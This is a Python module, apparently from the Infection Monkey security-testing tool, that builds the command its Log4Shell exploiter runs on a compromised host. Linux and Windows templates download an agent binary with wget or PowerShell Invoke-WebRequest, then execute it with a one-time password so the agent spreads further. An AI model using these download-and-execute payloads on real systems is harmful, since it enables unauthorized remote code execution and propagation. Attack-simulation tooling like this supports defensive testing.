from typing import Sequence

from common import OperatingSystem
from common.common_consts import AGENT_OTP_ENVIRONMENT_VARIABLE
from common.types import AgentID
from infection_monkey.exploit.tools.helpers import get_agent_dst_path
from infection_monkey.i_puppet import TargetHost
from infection_monkey.model import DROPPER_ARG
from infection_monkey.utils.commands import build_monkey_commandline

LOG4SHELL_LINUX_COMMAND = (
    "wget -O %(monkey_path)s %(http_path)s ;"
    "chmod +x %(monkey_path)s ;"
    " %(agent_otp_environment_variable)s=%(agent_otp)s "
    " %(monkey_path)s %(monkey_type)s %(parameters)s"
)

LOG4SHELL_WINDOWS_COMMAND = (
    'powershell -NoLogo -Command "'
    "Invoke-WebRequest -Uri '%(http_path)s' -OutFile '%(monkey_path)s' -UseBasicParsing; "
    "$env:%(agent_otp_environment_variable)s='%(agent_otp)s' ; "
    '%(monkey_path)s %(monkey_type)s %(parameters)s"'
)


def build_log4shell_command(
    agent_id: AgentID,
    target_host: TargetHost,
    servers: Sequence[str],
    current_depth: int,
    agent_download_url: str,
    otp: str,
) -> str:
    monkey_path = get_agent_dst_path(target_host)
    monkey_cmd = build_monkey_commandline(
        agent_id, servers, current_depth + 1, location=monkey_path
    )

    if OperatingSystem.WINDOWS == target_host.operating_system:
        base_command = LOG4SHELL_WINDOWS_COMMAND
    else:
        base_command = LOG4SHELL_LINUX_COMMAND

    return base_command % {
        "monkey_path": monkey_path,
        "http_path": agent_download_url,
        "monkey_type": DROPPER_ARG,
        "parameters": monkey_cmd,
        "agent_otp_environment_variable": AGENT_OTP_ENVIRONMENT_VARIABLE,
        "agent_otp": otp,
    }
